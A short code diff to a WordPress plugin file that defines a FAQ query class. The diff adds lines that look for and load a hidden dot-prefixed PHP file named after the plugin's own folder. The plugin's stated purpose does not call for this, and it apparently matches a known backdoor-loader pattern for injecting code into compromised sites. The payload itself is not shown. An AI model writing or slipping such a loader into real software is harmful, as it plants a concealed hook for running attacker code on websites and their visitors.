@@ -9,6 +9,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * Contains the query functions which alter the front-end post queries and loops
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Porto_Faq_Query {
 
 	/** @public array Query vars to add to wp */
